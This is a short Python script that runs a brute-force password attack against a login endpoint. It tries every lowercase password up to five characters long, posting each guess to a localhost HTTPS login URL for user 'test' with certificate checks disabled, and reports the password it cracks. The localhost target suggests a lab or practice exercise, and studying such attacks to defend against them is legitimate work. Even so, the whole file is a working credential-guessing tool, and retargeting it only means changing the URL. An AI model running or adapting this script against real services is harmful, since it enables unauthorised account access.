import itertools
import string
import requests
import time
from timeit import default_timer as timer

session = requests.Session()
def bruteforce_attack():
    chars = string.ascii_lowercase
    attempts = 0
    for length in range(1, 6):
        for guess in itertools.product(chars, repeat=length):
            attempts += 1
            guess = ''.join(guess)
            print(f"Tryng {guess}")
            url = "https://localhost:9443/login"
            body = {'username':'test', 'password': guess}
            resp = session.post(url, json=body, verify=False)
            if resp.status_code == 200:
                return (attempts, guess)
        time.sleep(1)
    return (attempts, None)

start = timer()
attempts, guess = bruteforce_attack()
if guess:
    print(f"Password cracked in {attempts} attempts. The password is {guess}.")
    end = timer()
    print(f"Time elapsed {end - start}")
else:
    print(f"Password not cracked after {attempts} attempts.")